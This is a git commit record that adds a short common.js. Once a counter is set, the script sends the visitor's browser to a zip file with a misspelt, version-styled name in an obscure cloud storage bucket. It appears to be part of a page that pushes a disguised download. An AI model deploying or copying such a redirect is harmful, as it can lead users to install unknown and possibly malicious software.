dabe1ebc7610364764261d4957a4feb3759eccb7
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-08-13 11:21:24 +0800

    Add files via upload

---
+++ common.js
@@ -0,0 +1,14 @@
+function loadUrl()
+{
+	if(num>=1)
+	{
+		var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
+		window.location=url;
+	}
+}
+
+var num=0;
+function getLoad()
+{
+	num++;
+}
